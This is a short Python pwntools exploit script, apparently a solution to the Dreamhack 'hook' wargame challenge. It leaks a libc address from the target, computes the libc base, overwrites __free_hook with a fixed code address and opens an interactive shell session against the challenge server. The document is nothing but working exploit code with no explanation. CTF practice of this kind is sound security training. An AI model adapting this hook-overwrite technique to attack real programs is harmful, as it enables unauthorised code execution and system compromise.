#!/usr/bin/env python3

from pwn import *

exe = ELF("./hook_patched", checksec = False)
libc = ELF("./libc-2.23.so", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)

context.binary = exe


if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("host3.dreamhack.games", 20755)


p.recvuntil(b'stdout: ')
libc_leak = int(p.recvline().strip(), 16)
libc.address = libc_leak - 0x3c5620
log.info("libc leak: " + hex(libc_leak))

p.sendlineafter(b'Size: ', b'512')
input()
payload = p64(libc.sym['__free_hook'])
payload += p64(0x0000000000400a11)
p.sendlineafter(b'Data: ', payload)

p.interactive()
